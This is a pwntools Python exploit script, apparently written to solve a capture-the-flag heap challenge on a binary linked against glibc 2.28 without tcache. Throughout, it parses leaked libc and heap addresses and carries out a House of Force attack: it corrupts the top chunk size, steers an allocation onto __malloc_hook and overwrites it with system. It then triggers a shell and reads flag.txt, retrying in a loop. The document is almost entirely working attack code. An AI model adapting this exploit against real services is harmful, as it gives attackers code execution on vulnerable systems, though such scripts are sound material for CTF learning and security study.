from pwn import *

while True:
	elf = ELF('./task')
	libc = ELF('./libc-2.28-no-tcache.so')
	# libc = ELF('./libc-2.28-no-tcache-symbols.so')
	
	if args.GDB:
		p = gdb.debug(elf.path, '\n'.join([
			"b *menu+165",
			"c"
		]))
	elif args.REMOTE:
		p = remote("localhost" if not args.ADDR else args.ADDR, 11328)
	else:
		p = process(elf.path) 

	puts = int(p.recvline().decode().split('@')[-1].strip(), 16)
	heap = int(p.recvline().decode().split('@')[-1].strip(), 16)

	print(f'puts {hex(puts)}')
	print(f'heap {hex(heap)}')

	libc.address = puts - libc.sym['puts']
	print(f'__malloc_hook {hex(libc.sym["__malloc_hook"])}')
	
	def malloc(size, contents=None):
		print(f'Requesting {hex(size)}')
		p.sendafter(b'Size: ', str(size).encode())
		if contents:
			p.sendafter(b'Data: ', contents)
	
	try:
		malloc(10, b'AAAAAAAAAAAAAAAAAAAAAAAA' + p64(0xffffffffffffffff))
		malloc(libc.sym['__malloc_hook'] - heap - 0x40, b'B' * 8)
		malloc(10, p64(libc.sym['system']))
		malloc(next(libc.search(b"/bin/sh")))
		
		# p.interactive()
		sleep(1.0)

		p.sendline(b'cat flag.txt')

		d = p.clean(1.0)
		if b'flAGH' in d:
			print(d)
			break

		print(d)
	except Exception as e:
		print(e)

	print("repeat")
